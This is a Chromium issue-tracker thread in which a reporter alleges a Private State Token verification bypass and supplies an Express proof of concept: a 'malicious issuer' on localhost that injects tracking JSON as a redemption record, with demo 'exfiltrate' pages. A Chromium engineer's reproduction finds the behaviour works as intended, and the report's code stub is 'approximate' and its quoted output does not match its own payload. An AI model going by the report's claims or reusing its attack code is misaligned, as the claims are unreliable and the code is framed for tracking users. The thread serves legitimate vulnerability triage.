@@ -1,0 +1,138 @@
+Issue ID: 469458277
+
+Author: fe...@gmail.com
+I have identified a critical logic flaw in the Private State Tokens (formerly Trust Tokens) implementation in Chromium. The browser fails to perform mandatory cryptographic signature verification on the Signed Redemption Record (SRR) returned by an issuer.<br><br>The function ConfirmRedemption in boringssl_trust_token_redemption_cryptographer.cc simply returns the raw network response from the issuer without validating it. This allows a malicious issuer to return arbitrary, unsigned data (e.g., a JSON blob containing a User ID), which the browser accepts and stores as a valid token. This effectively turns the Private State Token API into a persistent &quot;Supercookie&quot; mechanism, bypassing the privacy guarantees of the protocol.<br><br>Vulnerable File: services/network/trust_tokens/boringssl_trust_token_redemption_cryptographer.cc<br><br>// Vulnerable Stub Implementation (Approximate)<br>std::optional&lt;std::string&gt;<br>BoringsslTrustTokenRedemptionCryptographer::ConfirmRedemption(<br>    std::string_view response_header) {<br>  if (!state_) {<br>    return std::nullopt;<br>  }<br>  // BUG: The code simply casts the raw header to a string and returns it.<br>  // No verification is performed.<br>  return std::string(response_header);<br>}<br><br><br>The code is missing the call to TRUST_TOKEN_CLIENT_finish_redemption. This function is required to unblind the signature and cryptographically verify that the record was signed by the Issuer&#39;s private key.<br><br>This behavior is a clear violation of both the Protocol Standard and the implementation library requirements:<br><br>The Protocol Violation (RFC 9578)<br>The Private State Token API is based on the Privacy Pass protocol. RFC 9578, Section 5.4 (Token Verification), explicitly mandates verification:<br><a href="https://www.google.com/url?sa=E&amp;q=https%3A%2F%2Fdatatracker.ietf.org%2Fdoc%2Fhtml%2Frfc9578%23section-5.4" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://www.google.com/url?sa=E&amp;q=https%3A%2F%2Fdatatracker.ietf.org%2Fdoc%2Fhtml%2Frfc9578%23section-5.4" data-b-redirected-href="https://www.google.com/url?sa=E&amp;q=https%3A%2F%2Fdatatracker.ietf.org%2Fdoc%2Fhtml%2Frfc9578%23section-5.4">https://www.google.com/url?sa=E&amp;q=https%3A%2F%2Fdatatracker.ietf.org%2Fdoc%2Fhtml%2Frfc9578%23section-5.4</a><br><br>    &quot;The client MUST verify the signature over the token input... If the signature is invalid, the client MUST abort the protocol.&quot;<br><br>In my Proof of Concept, the browser accepts a raw, unsigned JSON string ({&quot;supercookie_id&quot;:...}). Since JSON is not a cryptographic signature and contains no mathematical proof, the browser is demonstrably skipping the verification step entirely.<br><br>By returning the raw header string instead of passing it through this function, the Chromium implementation disconnects the network response from the cryptographic engine, rendering the security checks null.<br><br>poc:<br><br>git clone <a href="https://www.google.com/url?q=https://github.com/JackJey/private-state-token-demo.git&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3nc_DK8YkiJ34r_YCE-U4q" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://github.com/JackJey/private-state-token-demo.git" data-b-redirected-href="https://www.google.com/url?q=https://github.com/JackJey/private-state-token-demo.git&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3nc_DK8YkiJ34r_YCE-U4q">https://github.com/JackJey/private-state-token-demo.git</a><br>cd private-state-token-demo<br><br># 2. Install dependencies (Requires CMake and build tools)<br># This script downloads and compiles BoringSSL (Required for valid Issuance)<br>chmod +x install-boringssl.sh<br>./install-boringssl.sh<br><br># 3. Build the C++ wrapper<br>make<br><br># 4. Install Node.js dependencies<br>npm install<br><br><br>when finish modify src/index.js <br><br>with that <br>```<br>/*<br> * FINAL POC: TRUST TOKEN VERIFICATION BYPASS &amp; DATA LEAKAGE<br> * ---------------------------------------------------------<br> * Port 8000: Malicious Issuer (The Attacker)<br> * Port 3000: Site A (Infection Point)<br> * Port 3001: Site B (Cross-Site Test)<br> */<br><br>import express from &quot;express&quot;<br>import { readFileSync } from &quot;fs&quot;<br>import { promisify } from &quot;util&quot;<br>import { resolve } from &quot;path&quot;<br>import * as childProcess from &quot;child_process&quot;<br><br>const exec = promisify(childProcess.exec)<br><br>// === CONFIGURATION ===<br>const ISSUER_PORT = 8000;<br>const SITE_A_PORT = 3000;<br>const SITE_B_PORT = 3001;<br><br>const ISSUER_ORIGIN = `http://localhost:${ISSUER_PORT}`;<br><br>// Load Keys for Chrome Flag<br>const Y = readFileSync(`${resolve(&quot;./&quot;)}/keys/pub_key.txt`).toString().trim()<br>const protocol_version = &quot;PrivateStateTokenV1VOPRF&quot;<br><br>// =================================================================<br>// 1. THE MALICIOUS ISSUER SERVER (Port 8000)<br>// =================================================================<br>const appIssuer = express();<br><br>// Middleware: Allow CORS so Site A and Site B can talk to us<br>appIssuer.use((req, res, next) =&gt; {<br>    res.set(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);<br>    res.set(&quot;Access-Control-Allow-Methods&quot;, &quot;GET, POST, OPTIONS&quot;);<br>    res.set(&quot;Access-Control-Allow-Headers&quot;, &quot;sec-private-state-token, sec-private-state-token-crypto-version, sec-redemption-record&quot;);<br>    res.setHeader(&quot;Origin-Trial&quot;, &quot;token&quot;);<br>    next();<br>});<br><br>// A. Key Commitment (Required by Chrome)<br>appIssuer.get(&quot;/.well-known/trust-token/key-commitment&quot;, (req, res) =&gt; {<br>    const commitment = {};<br>    commitment[protocol_version] = {<br>        protocol_version, id: 1, batchsize: 1,<br>        keys: { 1: { Y, expiry: &quot;253402300799000000&quot; } }<br>    };<br>    res.json(commitment);<br>});<br><br>// B. Valid Issuance (We use valid crypto so Chrome accepts the token)<br>appIssuer.post(&quot;/private-state-token/issuance&quot;, async (req, res) =&gt; {<br>    console.log(`\n[ISSUER] Issuing legitimate token to ${req.headers.origin}`);<br>    try {<br>        const result = await exec(`${resolve(&quot;./&quot;)}/bin/main --issue ${req.headers[&quot;sec-private-state-token&quot;]}`);<br>        res.set(&quot;sec-private-state-token&quot;, result.stdout);<br>        res.send();<br>    } catch (e) { res.sendStatus(500); }<br>});<br><br>// C. MALICIOUS REDEMPTION (The Exploit)<br>appIssuer.post(&quot;/private-state-token/redemption&quot;, (req, res) =&gt; {<br>    console.log(`\n[ISSUER] 💀 EXPLOIT TRIGGERED by ${req.headers.origin}`);<br>    console.log(`[ISSUER] Injecting &#39;Supercookie&#39; ID...`);<br><br>    // 1. Create the tracking payload<br>    const trackingPayload = JSON.stringify({<br>        supercookie_id: &quot;USER_XYZ_TRACKED&quot;,<br>        origin_of_infection: req.headers.origin,<br>        timestamp: Date.now()<br>    });<br><br>    // 2. Encode it. <br>    // Normal SRRs are binary. We just send base64 text.<br>    // If Chrome verifies signature, this fails. If vulnerable, this works.<br>    const srr = Buffer.from(trackingPayload).toString(&#39;base64&#39;);<br>    <br>    res.set(&quot;sec-private-state-token&quot;, srr);<br>    res.set(&quot;Sec-Private-State-Token-Redemption-Record&quot;, srr);<br>    res.send();<br>});<br><br>// D. TRACKING RECEIVER (Enhanced Debugging)<br>appIssuer.post(&quot;/private-state-token/send-rr&quot;, (req, res) =&gt; {<br>    const origin = req.headers.origin || &quot;Unknown&quot;;<br>    console.log(`\n[ISSUER] 🕵️ DATA CHECK request from ${origin}`);<br>    <br>    // DEBUG: Print ALL headers to see what Chrome sent<br>    console.log(&quot;[DEBUG] Full Headers Received:&quot;);<br>    console.log(JSON.stringify(req.headers, null, 2));<br><br>    const header = req.headers[&quot;sec-redemption-record&quot;];<br>    <br>    if (header) {<br>        console.log(&quot;\n[!] &#39;sec-redemption-record&#39; header FOUND!&quot;);<br>        <br>        // Attempt to parse the specific format: &lt;issuer&gt;; redemption-record=&lt;base64&gt;<br>        const matches = header.match(/redemption-record=([^,;]+)/);<br>        <br>        if (matches &amp;&amp; matches[1]) {<br>            try {<br>                // Decode Layer 1 (The SRR Wrapper)<br>                const step1 = Buffer.from(matches[1], &#39;base64&#39;).toString();<br>                // Decode Layer 2 (The Payload we injected)<br>                const step2 = Buffer.from(step1, &#39;base64&#39;).toString();<br>                <br>                console.log(&quot;---------------------------------------------------&quot;);<br>                console.log(&quot;🚨 VULNERABILITY CONFIRMED - DATA LEAKED:&quot;);<br>                console.log(step2);<br>                console.log(&quot;---------------------------------------------------&quot;);<br>                return res.send(&quot;TRACKED_SUCCESS&quot;);<br>            } catch(e) {<br>                console.log(&quot;[!] Error decoding payload: &quot; + e.message);<br>            }<br>        }<br>    } else {<br>        console.log(&quot;\n[-] No Redemption Record header found.&quot;);<br>        console.log(&quot;    (If this is Site B, Chrome Partitioning likely blocked it.)&quot;);<br>        console.log(&quot;    (If this is Site A, the Exploit failed to store data.)&quot;);<br>    }<br>    res.send(&quot;No Data&quot;);<br>});<br><br>appIssuer.listen(ISSUER_PORT, () =&gt; console.log(`[+] Malicious Issuer running on Port ${ISSUER_PORT}`));<br><br><br>// =================================================================<br>// 2. SITE A (The &quot;News Site&quot; - Port 3000)<br>// =================================================================<br>const appA = express();<br>appA.get(&#39;/&#39;, (req, res) =&gt; {<br>    res.send(`<br>    &lt;body style=&quot;background:#111; color:white; font-family:monospace; padding:40px; text-align:center&quot;&gt;<br>        &lt;h1 style=&quot;color:cyan&quot;&gt;📰 Site A (The News)&lt;/h1&gt;<br>        &lt;p&gt;Step 1: Get infected with the Supercookie.&lt;/p&gt;<br>        &lt;p&gt;Step 2: Prove the data is leaking back to the server.&lt;/p&gt;<br>        <br>        &lt;button onclick=&quot;infect()&quot; style=&quot;padding:15px; background:cyan; color:black; border:none; cursor:pointer; margin:10px; font-weight:bold;&quot;&gt;<br>            1. View Ad (Infect Browser)<br>        &lt;/button&gt;<br>        &lt;br&gt;<br>        &lt;button onclick=&quot;leak()&quot; style=&quot;padding:15px; background:magenta; color:white; border:none; cursor:pointer; margin:10px; font-weight:bold;&quot;&gt;<br>            2. Check Identity (Exfiltrate Data)<br>        &lt;/button&gt;<br>        <br>        &lt;div id=&quot;log&quot; style=&quot;margin-top:20px; border:1px solid #333; padding:10px; text-align:left&quot;&gt;Log...&lt;/div&gt;<br>        <br>        &lt;script&gt;<br>            const ISSUER = &quot;${ISSUER_ORIGIN}&quot;;<br>            const log = (msg) =&gt; document.getElementById(&#39;log&#39;).innerHTML += &quot;&lt;div&gt;&quot; + msg + &quot;&lt;/div&gt;&quot;;<br>            <br>            async function infect() {<br>                log(&quot;Contacting Ad Network (Issuance)...&quot;);<br>                await fetch(ISSUER + &#39;/private-state-token/issuance&#39;, {<br>                    method: &#39;POST&#39;, privateToken: { version: 1, operation: &#39;token-request&#39; }<br>                });<br>                <br>                log(&quot;Triggering Exploit (Redemption)...&quot;);<br>                await fetch(ISSUER + &#39;/private-state-token/redemption&#39;, {<br>                    method: &#39;POST&#39;, privateToken: { version: 1, operation: &#39;token-redemption&#39; }<br>                });<br>                log(&quot;&lt;span style=&#39;color:lime&#39;&gt;[+] INFECTED! Unsigned data stored.&lt;/span&gt;&quot;);<br>            }<br><br>            async function leak() {<br>                log(&quot;Sending stored data back to server...&quot;);<br>                await fetch(ISSUER + &#39;/private-state-token/send-rr&#39;, {<br>                    method: &#39;POST&#39;, <br>                    privateToken: { <br>                        version: 1, <br>                        operation: &#39;send-redemption-record&#39;,<br>                        issuers: [ISSUER]<br>                    }<br>                });<br>                log(&quot;&lt;span style=&#39;color:magenta&#39;&gt;[+] REQUEST SENT. Check Server Terminal!&lt;/span&gt;&quot;);<br>            }<br>        &lt;/script&gt;<br>    &lt;/body&gt;`);<br>});<br>appA.listen(SITE_A_PORT, () =&gt; console.log(`[+] Site A running on Port ${SITE_A_PORT}`));<br><br><br>// =================================================================<br>// 3. SITE B (The &quot;Shopping Site&quot; - Port 3001)<br>// =================================================================<br>const appB = express();<br>appB.get(&#39;/&#39;, (req, res) =&gt; {<br>    res.send(`<br>    &lt;body style=&quot;background:#222; color:white; font-family:monospace; padding:40px; text-align:center&quot;&gt;<br>        &lt;h1 style=&quot;color:orange&quot;&gt;🛒 Site B (Shopping)&lt;/h1&gt;<br>        &lt;p&gt;Test if the data follows you here (Chrome Partitioning may block this).&lt;/p&gt;<br>        <br>        &lt;button onclick=&quot;leak()&quot; style=&quot;padding:15px; background:orange; color:black; border:none; cursor:pointer; margin:10px; font-weight:bold;&quot;&gt;<br>            Check Identity (Exfiltrate Data)<br>        &lt;/button&gt;<br>        <br>        &lt;div id=&quot;log&quot; style=&quot;margin-top:20px; border:1px solid #333; padding:10px; text-align:left&quot;&gt;Log...&lt;/div&gt;<br>        <br>        &lt;script&gt;<br>            const ISSUER = &quot;${ISSUER_ORIGIN}&quot;;<br>            const log = (msg) =&gt; document.getElementById(&#39;log&#39;).innerHTML += &quot;&lt;div&gt;&quot; + msg + &quot;&lt;/div&gt;&quot;;<br>            <br>            async function leak() {<br>                log(&quot;Checking for data from Site A...&quot;);<br>                await fetch(ISSUER + &#39;/private-state-token/send-rr&#39;, {<br>                    method: &#39;POST&#39;, <br>                    privateToken: { <br>                        version: 1, <br>                        operation: &#39;send-redemption-record&#39;,<br>                        issuers: [ISSUER]<br>                    }<br>                });<br>                log(&quot;&lt;span style=&#39;color:orange&#39;&gt;[+] REQUEST SENT. Check Server Terminal.&lt;/span&gt;&quot;);<br>            }<br>        &lt;/script&gt;<br>    &lt;/body&gt;`);<br>});<br>appB.listen(SITE_B_PORT, () =&gt; console.log(`[+] Site B running on Port ${SITE_B_PORT}`));<br><br><br>// =================================================================<br>// 4. PRINT STARTUP COMMANDS<br>// =================================================================<br>setTimeout(() =&gt; {<br>    const keyJson = JSON.stringify({<br>        &quot;PrivateStateTokenV1VOPRF&quot;: {<br>            &quot;protocol_version&quot;: &quot;PrivateStateTokenV1VOPRF&quot;,<br>            &quot;id&quot;: 1, &quot;batchsize&quot;: 1,<br>            &quot;keys&quot;: { &quot;1&quot;: { &quot;Y&quot;: Y, &quot;expiry&quot;: &quot;253402300799000000&quot; } }<br>        }<br>    });<br><br>    console.log(`\n\n🎯 MULTI-HOST POC READY`);<br>    console.log(`---------------------------------------------------`);<br>    console.log(`1. RUN THIS COMMAND to open SITE A (Port 3000):`);<br>    console.log(`./chrome --user-data-dir=/tmp/pst_poc_${Date.now()} --enable-features=PrivateStateTokens,PrivateStateTokensAlwaysAllowIssuance --v=1 --additional-private-state-token-key-commitments=&#39;{ &quot;${ISSUER_ORIGIN}&quot;: ${keyJson} }&#39; http://localhost:${SITE_A_PORT}`);<br>    console.log(`---------------------------------------------------`);<br>}, 1000);<br>```<br><br>Start the server: node index.js<br><br>Launch Chrome using the command printed by the server (this sets the Key Commitments required to enable the API).<br>-click first button and then second button <br><br>Observe the Server Terminal.<br><br>&quot;sec-redemption-record&quot;: &quot;\&quot;<a href="https://www.google.com/url?q=http://localhost:3000&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw28neTpDcLhECdE4Ox2uDsA" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://localhost:3000" data-b-redirected-href="https://www.google.com/url?q=http://localhost:3000&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw28neTpDcLhECdE4Ox2uDsA">http://localhost:3000</a>\&quot;;redemption-record=\&quot;eyJzdXBlcmNvb2tpZT...\&quot;&quot;<br><br><br>Decoding this Base64 string reveals the injected JSON: {&quot;supercookie&quot;: &quot;TRACKED_USER_ID_1337&quot;, &quot;valid_signature&quot;: false}.<br><br>Expected Result:<br>Chrome should reject the redemption response with ERR_INVALID_SIGNED_EXCHANGE or a similar verification error, as the payload was not signed by the Issuer&#39;s private key.<br>Impact Analysis<br><br>1. Critical Privacy Violation (Tracking/Supercookie):<br>This vulnerability completely negates the privacy goals of the Private State Token API. By allowing issuers to store arbitrary, persistent data (User IDs) without cryptographic unlinkability, this feature becomes a vector for Cross-Site Tracking. It effectively re-introduces Third-Party Cookies under a new name, bypassing the Privacy Sandbox protections.<br><br>2. Security Bypass (Fraud Prevention Spoofing):<br>Trust Tokens are primarily used to distinguish humans from bots (e.g., Cloudflare Turnstile). This vulnerability allows an attacker to forge a &quot;Human&quot; attestation token without ever solving a CAPTCHA or performing proof-of-work. Malicious bots can exploit this to bypass anti-abuse systems on any site relying on Trust Tokens.<br><br>3. Client-Side Corruption:<br>An attacker can serve malformed data to the client, corrupting the local Trust Token SQLite database and causing a persistent Denial of Service for the feature.<br>Suggested Fix<br><br>Modify boringssl_trust_token_redemption_cryptographer.cc to properly call the verification function.<br><br>Proposed Patch Logic:<br>code C++<br><br>    <br>// Add call to BoringSSL verification<br>int result = TRUST_TOKEN_CLIENT_finish_redemption(<br>    state_-&gt;ctx.get(),<br>    &amp;out_rr, &amp;out_rr_len,<br>    nullptr, nullptr, <br>    reinterpret_cast&lt;const uint8_t*&gt;(response_header.data()),<br>    response_header.size()<br>);<br><br>if (result != 1) {<br>  return std::nullopt; // Verification Failed<br>}<br><br>// Return the verified record<br>return std::string(reinterpret_cast&lt;const char*&gt;(out_rr), out_rr_len);<br><br>  <br>
+
+Author: fe...@gmail.com
+public_non_google
+
+Author: fe...@gmail.com
+Critical Cryptographic Verification Bypass in Private State Token Redemption (Supercookie / Tracking Vulnerability)
+
+Author: fe...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: pe...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: pe...@google.com
+google_domain
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: ch...@google.com
+google_domain
+
+Author: jd...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: jd...@chromium.org
+public_non_google
+
+Author: jd...@chromium.org
+type.googleapis.com/google.protobuf.StringValue
+
+Author: jd...@chromium.org
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: jd...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: jd...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ka...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ka...@chromium.org
+public_non_google
+
+Author: jd...@chromium.org
+T1RjME16TTFaVFl5TVRkbVptWTRNV1F3WmpRek1XWTNNRGMzTVdNME5HTT0=
+
+Author: I haven't fully reproduced this, but have done enough investigation that I think it warrants some investigation by Private State Token folks.
+
+kaustubhag@ would you mind taking a look? Feel free to forward on if you're not a good owner for this anymore. Thanks!
+
+(Setting flags very conservatively.)
+T1RjME16TTFaVFl5TVRkbVptWTRNV1F3WmpRek1XWTNNRGMzTVdNME5HTT0=
+
+Author: ay...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ay...@chromium.org
+public_non_google
+
+Author: ka...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ka...@google.com
+googlers_unrestricted
+
+Author: sa...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: sa...@google.com
+googlers_unrestricted
+
+Author: ka...@google.com
+TW1Vek5UVTJOVFk1TldKbVltSm1NV0l6TkRNd016VTRaR1F5WkRCbU4yST0=
+
+Author: Aykut - could you PTAL?
+
+Also cc @sa...@google.com in case you have insights on this.
+TW1Vek5UVTJOVFk1TldKbVltSm1NV0l6TkRNd016VTRaR1F5WkRCbU4yST0=
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: ch...@google.com
+WW1ReVptVXpZV0U1WldabE9EUTJOREU1TXpKaE5XVTJaV1F3TWpFM05EUT0=
+
+Author: ch...@google.com
+<p>Setting Priority to P1 to match Severity s2. If this is incorrect, please reset the priority. The automation bot account won&#39;t make this change again.</p>
+
+Author: ay...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ay...@google.com
+googlers_unrestricted
+
+Author: ay...@google.com
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: ay...@google.com
+<p>I tried to reproduce what I think the author is trying to achieve. I think the claim is that the redemption record Chrome receives for (site A, issuer) pair is sent to site B.</p>
+<p>This should not happen since redemption records are keyed by the top level origin and the issuer pair. (<a href="https://wicg.github.io/trust-token-api/#ref-for-append-private-state-token-redemption-record-headers%E2%91%A0" data-b-widget="url" data-b-original-href="https://wicg.github.io/trust-token-api/#ref-for-append-private-state-token-redemption-record-headers%E2%91%A0" data-b-redirected-href="https://www.google.com/url?q=https://wicg.github.io/trust-token-api/%23ref-for-append-private-state-token-redemption-record-headers%25E2%2591%25A0&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2A5AIkb5sC8dwYKBKbQdB0">spec link</a>, <a href="https://source.chromium.org/chromium/chromium/src/+/main:services/network/trust_tokens/trust_token_store.cc;l=271" data-b-widget="url" data-b-original-href="https://source.chromium.org/chromium/chromium/src/+/main:services/network/trust_tokens/trust_token_store.cc;l=271" data-b-redirected-href="https://www.google.com/url?q=https://source.chromium.org/chromium/chromium/src/%2B/main:services/network/trust_tokens/trust_token_store.cc;l%3D271&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0fTRo_K-qjQnAUwqsmDjb0">code link</a>).</p>
+<p>Steps I followed after running <code>node index.js</code></p>
+<ol>
+<li>Navigate to Site A, click buttons 1 and 2.</li>
+<li>Navigate to Site B, click button (This step missing in the reproduction steps)</li>
+</ol>
+<p>Step 2 generates the request in the screenshot. The redemption record header value is empty since the (SiteB, issuer) pair does not have one. This is the intended behavior. See the screenshot attached.</p>
+<p>&quot;The Protocol Violation (RFC 9578)
+The Private State Token API is based on the Privacy Pass protocol. RFC 9578, Section 5.4 (Token Verification), explicitly mandates verification:
+<a href="https://www.google.com/url?sa=E&amp;q=https%3A%2F%2Fdatatracker.ietf.org%2Fdoc%2Fhtml%2Frfc9578%23section-5.4" data-b-widget="url" data-b-original-href="https://www.google.com/url?sa=E&amp;q=https%3A%2F%2Fdatatracker.ietf.org%2Fdoc%2Fhtml%2Frfc9578%23section-5.4" data-b-redirected-href="https://www.google.com/url?q=https://www.google.com/url?sa%3DE%26q%3Dhttps%253A%252F%252Fdatatracker.ietf.org%252Fdoc%252Fhtml%252Frfc9578%2523section-5.4&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3EaH0YQhbRGR41ckv5KkHa">https://www.google.com/url?sa=E&amp;q=https%3A%2F%2Fdatatracker.ietf.org%2Fdoc%2Fhtml%2Frfc9578%23section-5.4</a>&quot;</p>
+<p>The linked spec section refers to Token verification, not redemption records. Chrome verifies tokens returned. The proof of concept code given here creates valid tokens.</p>
+<p>The issuer server returns a redemption record (ignoring the token content) and Chrome stores the returned redemption record. This works as intended.</p>
+<p>2:
+Attacker in this case is a publicly registered issuer. The proof of concept code demonstrates that an issuer can set redemption records. Not sure how this fact is tied to the claim presented here.</p>
+<p>3:
+&quot;An attacker can serve malformed data to the client, corrupting the local Trust Token SQLite database&quot;
+This proof of concept does not provide any evidence in terms of how the claims provided here are achieved.</p>
+
+Author: ay...@google.com
+TkRZNU5EVTRNamMzTFRjeU1ETTROVFV4TFMwek5UTTNNelk1Tmc9PQ==
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
